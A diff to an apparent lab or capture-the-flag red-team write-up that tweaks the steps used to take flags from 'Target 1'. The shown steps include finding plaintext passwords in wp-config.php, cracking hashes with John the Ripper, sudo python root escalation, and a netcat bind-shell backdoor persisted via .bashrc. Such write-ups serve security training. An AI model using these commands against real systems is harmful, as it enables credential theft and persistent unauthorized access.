@@ -104,7 +104,7 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag3.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
     - **Exploit Used**
-      - Find plain text password my MySQL database
+      - Find plain text password in MySQL database
         - `grep -rnw ./ -e 'password' 2>/dev/null`
         - `nano /var/www/html/wordpress/wp-config.php`
         - ![PlaintextPW](/Images/PlaintextPW.PNG)
@@ -117,16 +117,16 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
 
   - `flag4.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
     - **Exploit Used**
-      - Find user hashed password
+      - Find user hashed password in MySQL database
         - ![hash](/Images/HashPW.png)
-      - Crack user hashed password with Jack the Ripper
+      - Crack user hashed password with Jack the Ripper in a Kali terminal
         - Create a .txt file with the usernames and hash passwords
           - ![hashtxt](/Images/HashPWtext.png)
         - `john hash_pw.txt`
           - ![Cracked](/Images/Cracked.PNG)
       - Log in as Steven with cracked password
         - ![SSHSteven](/Images/SSHSteven.png)
-      - Escalate to root
+      - Explore and escalate privilege to root
         - ![UserPrivilages](/Images/UserPrivilages.png)
         - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
       - Search for flag4
@@ -137,11 +137,11 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
       - Backdoor installed: (Bind Shell) Netcat
       - Set up a listener on Target 1 by:
         - Gain root access to Target 1 and executing:
-          - `nc -lvnp 444 - /bin/bash`
+          - `nc -lvnp 4444 -e /bin/bash`
           - Save a .sh file of the command in .bashrc
-        - Connect it to Kali by: 
-          - `nc 192.168.1.110 4444`
-        - ![Backdoor](/Images/Backdoor.png)
+      - Connect it to Kali by: 
+        - `nc 192.168.1.110 4444`
+      - ![Backdoor](/Images/Backdoor.png)
 
 
 
